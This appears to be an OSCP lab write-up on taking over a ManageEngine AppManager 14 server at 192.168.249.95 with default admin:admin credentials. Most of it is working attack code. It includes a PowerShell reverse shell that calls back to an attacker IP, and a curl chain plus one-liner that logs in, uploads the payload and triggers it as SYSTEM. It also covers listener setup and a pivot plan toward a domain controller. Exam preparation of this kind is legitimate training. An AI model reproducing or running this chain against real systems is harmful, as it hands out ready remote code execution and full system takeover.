# 🎯 Foothold - 192.168.249.95 (App Server)

| Item | Value |
|------|-------|
| **Target** | 192.168.249.95:8443 |
| **Service** | ManageEngine AppManager 14 |
| **Vuln Type** | Authenticated RCE (Default Creds) |
| **Shell** | NT AUTHORITY\SYSTEM |

---

## 🔓 Credentials
```
admin : admin
```

---

## 🖥️ Method 1: Browser (GUI)

1. Browse to `https://192.168.249.95:8443`
2. Login with `admin:admin`
3. Go to **Admin** → **Execute Program Actions**
4. Click **New Action**
   - Name: `pwned`
   - Command: `shell.bat`
   - Working Dir: `C:\Program Files\ManageEngine\AppManager14\working\`
5. Upload `shell.bat` via any upload feature (or Admin → Upload Files)
6. Start listener: `nc -lvnp 9001`
7. Click **Test** on your action → 🐚 Shell!

---

## ⌨️ Method 2: CLI (curl)

### Payload Setup
```bash
# Create reverse shell payload (change IP!)
cat > shell.bat << 'EOF'
@echo off
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('LHOST',9001);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
EOF
sed -i 's/LHOST/192.168.45.204/' shell.bat
```

### Exploit Chain
```bash
# 1️⃣ Get session cookie
curl -k -s -c cookies.txt https://192.168.249.95:8443/index.do -o /dev/null

# 2️⃣ Authenticate
curl -k -s -c cookies.txt -b cookies.txt -X POST \
  https://192.168.249.95:8443/j_security_check \
  -d "clienttype=html&j_username=admin&j_password=admin" -o /dev/null

# 3️⃣ Upload payload
curl -k -s -b cookies.txt -X POST https://192.168.249.95:8443/Upload.do \
  -F "uploadDir=./" -F "theFile=@shell.bat"

# 4️⃣ Create action (note the actionid!)
curl -k -s -b cookies.txt -X POST https://192.168.249.95:8443/adminAction.do \
  -d "method=createExecProgAction&id=0&displayname=pwned&serversite=local&choosehost=-2" \
  -d "command=shell.bat&execProgExecDir=C:\Program Files\ManageEngine\AppManager14\working\\&abortafter=10&cancel=false" \
  | grep -oP 'actionid=\d+'

# 5️⃣ Start listener (separate terminal)
nc -lvnp 9001

# 6️⃣ Trigger shell (use actionid from step 4)
curl -k -s -b cookies.txt \
  "https://192.168.249.95:8443/common/executeScript.do?method=testAction&actionID=10000003&haid=null"
```

---

## 🚀 One-Liner (Speed Run)

```bash
curl -k -s -c c.txt https://192.168.249.95:8443/index.do -o /dev/null && \
curl -k -s -c c.txt -b c.txt -X POST https://192.168.249.95:8443/j_security_check \
  -d "j_username=admin&j_password=admin&clienttype=html" -o /dev/null && \
curl -k -s -b c.txt -X POST https://192.168.249.95:8443/Upload.do \
  -F "uploadDir=./" -F "theFile=@shell.bat" -o /dev/null && \
AID=$(curl -k -s -b c.txt -X POST https://192.168.249.95:8443/adminAction.do \
  -d "method=createExecProgAction&id=0&displayname=pwn&serversite=local&choosehost=-2&command=shell.bat&execProgExecDir=C:\Program Files\ManageEngine\AppManager14\working\\&abortafter=10&cancel=false" \
  | grep -oP 'actionid=\K\d+') && \
curl -k -s -b c.txt "https://192.168.249.95:8443/common/executeScript.do?method=testAction&actionID=$AID&haid=null"
```

---

## 📚 Key Endpoints

| Endpoint | Purpose |
|----------|---------|
| `/j_security_check` | Java EE standard auth |
| `/Upload.do` | Admin file upload |
| `/adminAction.do` | Create execution tasks |
| `/common/executeScript.do` | Trigger execution |
| `/common/serverinfo.do` | Leaks install path |

---

## 💡 Educational Lessons

### 🔑 Why This Works
- Default credentials = instant admin
- "Execute Program Actions" is a **feature**, not a bug
- AppManager runs as SYSTEM for monitoring purposes
- Upload + Execute = RCE by design

### 📖 Key Takeaways
- **Always check default creds** - ManageEngine products notorious for this
- **j_security_check** = Java EE standard (works on Tomcat, JBoss, WebLogic)
- **-c/-b cookies.txt** = curl's session management
- **Working directory** matters - find it via `/serverinfo.do`
- **Monitoring tools** often have dangerous features (execute scripts, upload files)

### 🧠 OSCP Exam Tips
- Document each curl command separately for debugging
- If curl fails, replicate in Burp to see full request/response
- Browser method is backup if CLI breaks
- This whole chain takes ~5-10 minutes once familiar

### ⚠️ Common Mistakes
- Forgetting to update LHOST in payload
- Not noting the `actionid` from step 4
- Using wrong working directory path
- Firewall blocking reverse connection (check `iptables -F`)

### 🛡️ Defense Perspective
- Change default credentials
- Restrict Upload.do file types
- Disable "Test Action" in production
- Run as low-privilege service account
- Firewall admin interface to internal only

---

## ✅ Next Steps
- [ ] Grab `local.txt` / `proof.txt`
- [ ] Domain enumeration from SYSTEM
- [ ] Pivot to .96 (DB) and .97 (DC01)
